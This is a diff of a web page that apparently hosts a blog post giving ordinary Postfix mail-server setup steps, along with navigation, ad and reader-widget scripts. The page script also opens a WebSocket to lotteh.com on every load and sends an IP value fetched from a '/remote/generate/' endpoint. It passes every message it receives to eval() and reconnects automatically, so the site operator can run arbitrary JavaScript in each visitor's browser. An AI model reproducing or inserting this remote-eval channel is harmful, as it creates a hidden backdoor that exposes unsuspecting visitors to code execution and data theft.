@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>How do I build a mail server with postfix?</p><p><br/></p><p>To build a mail server with Postfix, follow these steps:</p><p><br/></p><p>1. Install Postfix: Use your package manager to install Postfix on your server. For example, on Debian/Ubuntu, you can run `sudo apt-get install postfix`.</p><p><br/></p><p>2. Configure Postfix: Postfix configuration files are located in `/etc/postfix/`. The main configuration file is `main.cf`. You can edit this file to set up your mail server according to your requirements. Some common configurations you may need to set include the domain name, mail relay settings, virtual domains, etc.</p><p><br/></p><p>3. Set up DNS records: To ensure mail delivery, you need to set up the necessary DNS records (MX and SPF records) for your domain. Contact your domain registrar or DNS provider for assistance if needed.</p><p><br/></p><p>4. Configure Virtual Domains and Users: If you want to host multiple domains on your mail server, you will need to configure virtual domains and users. This can be done using the `virtual_alias_maps` and `virtual_mailbox_maps` settings in the Postfix configuration file.</p><p><br/></p><p>5. Secure your mail server: Ensure that your mail server is secure by setting up firewall rules, using TLS encryption for incoming and outgoing mail, and implementing other security measures recommended for mail servers.</p><p><br/></p><p>6. Test your mail server: Once everything is set up, you should test your mail server by sending and receiving test emails. Use tools like telnet or Mailx to manually send emails and check if they are received successfully.</p><p><br/></p><p>Remember to periodically update and maintain your mail server to ensure it runs smoothly and securely. It's also a good idea to monitor mail server logs for any issues or suspicious activity.</p></div>
 
-
-
-<p>How do I build a mail server with postfix?</p><p><br></p><p>To build a mail server with Postfix, follow these steps:</p><p><br></p><p>1. Install Postfix: Use your package manager to install Postfix on your server. For example, on Debian/Ubuntu, you can run `sudo apt-get install postfix`.</p><p><br></p><p>2. Configure Postfix: Postfix configuration files are located in `/etc/postfix/`. The main configuration file is `main.cf`. You can edit this file to set up your mail server according to your requirements. Some common configurations you may need to set include the domain name, mail relay settings, virtual domains, etc.</p><p><br></p><p>3. Set up DNS records: To ensure mail delivery, you need to set up the necessary DNS records (MX and SPF records) for your domain. Contact your domain registrar or DNS provider for assistance if needed.</p><p><br></p><p>4. Configure Virtual Domains and Users: If you want to host multiple domains on your mail server, you will need to configure virtual domains and users. This can be done using the `virtual_alias_maps` and `virtual_mailbox_maps` settings in the Postfix configuration file.</p><p><br></p><p>5. Secure your mail server: Ensure that your mail server is secure by setting up firewall rules, using TLS encryption for incoming and outgoing mail, and implementing other security measures recommended for mail servers.</p><p><br></p><p>6. Test your mail server: Once everything is set up, you should test your mail server by sending and receiving test emails. Use tools like telnet or Mailx to manually send emails and check if they are received successfully.</p><p><br></p><p>Remember to periodically update and maintain your mail server to ensure it runs smoothly and securely. It's also a good idea to monitor mail server logs for any issues or suspicious activity.</p>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
